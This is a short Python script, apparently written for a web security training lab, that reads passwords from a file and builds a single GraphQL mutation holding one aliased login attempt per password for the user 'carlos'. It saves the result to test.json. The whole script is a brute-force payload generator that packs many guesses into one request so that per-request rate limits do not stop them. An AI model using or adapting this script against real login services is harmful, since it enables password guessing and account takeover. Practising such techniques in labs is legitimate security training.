import json

passwords = []
with open("./pass.txt", "r") as file:
    for line in file:
        passwords.append(line.strip())

# print(passwords)

base_string = "\n mutation login{"
idx = 1
for passd in passwords:
    base_string += (
        "\n login"
        + str(idx)
        + ": login(input:"
        + '{username: "carlos", password: '
        + f'"{passd}"'
        + " }"
        + " ) {\n token\n success\n }\n "
    )
    idx += 1

base_string += " }"

dict_to_write = base_string

with open("test.json", "w") as outfile:
    outfile.write(dict_to_write)
